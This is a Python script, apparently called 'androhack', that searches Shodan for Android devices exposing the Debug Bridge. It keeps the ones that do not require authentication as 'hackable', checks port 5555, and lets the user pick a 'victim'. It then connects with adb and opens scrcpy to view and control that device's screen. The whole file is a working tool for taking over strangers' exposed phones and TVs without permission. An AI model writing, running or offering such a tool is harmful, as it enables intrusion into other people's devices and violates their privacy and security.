#!/bin/python3

import os
import sys
import json
import shodan
import socket
import subprocess
import random
from colorama import Fore, Style


# Define the search query
query = 'Android Debug Bridge'

# Initialize an empty list to store the IP addresses
ip_list = []
hackable_ip = []
alive_ip = []





def load_ip_file():
    global ip_list, hackable_ip
    home_dir = os.path.expanduser("~")
    folder_path = os.path.join(home_dir, ".androhack")
    ip_list_file = os.path.join(folder_path, "ip_list.txt")
    hackable_ip_file = os.path.join(folder_path, "hackable_ip_list.txt")
    with open(ip_list_file, "r") as f:
        ip_list = json.load(f)
    with open(hackable_ip_file, "r") as f:
        hackable_ip = json.load(f)





def adb_restart():
    subprocess.run(['adb', 'kill-server'])
    subprocess.run(['adb', 'start-server'])





def setup():
    adb_restart()
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Set Working Directory
    home_dir = os.path.expanduser("~")
    folder_path = os.path.join(home_dir, ".androhack")

    # Display LOGO
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    random_color = random.choice(colors)
    logo = os.path.join(folder_path, "logo.txt")
    with open(logo, 'r') as f:
        logo_contents = f.read()
    print(random_color + logo_contents + Style.RESET_ALL)
    
    # Setup the API client
    api_key = os.path.join(folder_path, "shodan_api_key.txt")
    with open(api_key, 'r') as file:
        api_key = file.read().strip()
    global api
    api = shodan.Shodan(api_key)





    

def update_device():
    print(Fore.MAGENTA + "Updating Device List, please wait ... " + Style.RESET_ALL, end=" ")
    sys.stdout.flush() # Clearing Buffer
    try:
        # Search Shodan
        results = api.search(query)
        # Add the IP addresses to the list
        for result in results['matches']:
            banner = result['data']
            ip_list.append(result['ip_str'])        
            if 'Authentication is required' not in banner:
                hackable_ip.append(result['ip_str'])

    except shodan.APIError as e:
        print(f"Error: {e}")

    print()
    # Save the list into file
    home_dir = os.path.expanduser("~")
    folder_path = os.path.join(home_dir, ".androhack")
    ip_file = os.path.join(folder_path, "ip_list.txt")
    hackable_ip_file = os.path.join(folder_path, "hackable_ip_list.txt")
    with open(ip_file, "w") as f:
        json.dump(ip_list, f)
    with open(hackable_ip_file, "w") as f:
        json.dump(hackable_ip, f)






def print_status():
    print()
    print(Fore.YELLOW + "Total Devices: " + str(len(ip_list)) + Style.RESET_ALL)
    print(Fore.YELLOW + "Hackable: " + str(len(hackable_ip)) + Style.RESET_ALL)
    print(Fore.YELLOW + "Online: " + str(len(alive_ip)) + Style.RESET_ALL)







def alive_devices():
    print(Fore.MAGENTA + "Checking Currently Alive Devices, please wait ... " + Style.RESET_ALL, end=" ")
    sys.stdout.flush() # Clearing Buffer
    for ip in ip_list:
        try:
            # Attempt to connect to port 5555
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, 5555))
            s.close()
            # If the connection succeeds, add the IP to the list
            alive_ip.append(ip)
            # print(f"IP {ip} is alive on port 5555")
        except (socket.timeout, ConnectionRefusedError):
            # If the connection fails, continue to the next IP
            pass
    print()






def connect_adb(ip_address):
    # Define the ADB command to connect to the device
    adb_cmd = f"adb connect {ip_address}:5555"

    # Run the ADB command using subprocess
    process = subprocess.Popen(adb_cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()

    # Check if the connection was successful
    if "connected" in str(output):
        print(f"Successfully connected to {ip_address}")
    else:
        print(f"Failed to connect to {ip_address}")
        print(f"Error message: {error.decode('utf-8').strip()}")






def connect_adb_scrcpy(ip_address):
    # Define the ADB command to connect to the device
    adb_cmd = f"adb connect {ip_address}:5555"

    # Run the ADB command using subprocess
    process = subprocess.Popen(adb_cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()

    # Check if the connection was successful
    if "connected" in str(output):
        print(f"Successfully connected to {ip_address}")

        # Use ADB to forward the device's screen to your computer using scrcpy
        scrcpy_cmd = "scrcpy"
        subprocess.call(scrcpy_cmd, shell=True)

    else:
        print(f"Failed to connect to {ip_address}")
        print(f"Error message: {error.decode('utf-8').strip()}")






def connectWithVictim():
    print()
    print(Fore.GREEN + "Currently Online: " + Style.RESET_ALL)
    for index, value in enumerate(alive_ip):
        print(f"Index: {index}, IP: {value}")
    print()
    x = input("Enter Index => ")
    x = int(x)
    try:
        connect_adb_scrcpy(alive_ip[x])
    except Exception as e:
        connectWithVictim()
    subprocess.run(['adb', 'disconnect'])





if __name__ == "__main__":
    setup()
    load_ip_file()
    # update_device()
    alive_devices()
    print_status()

    while True:
        connectWithVictim()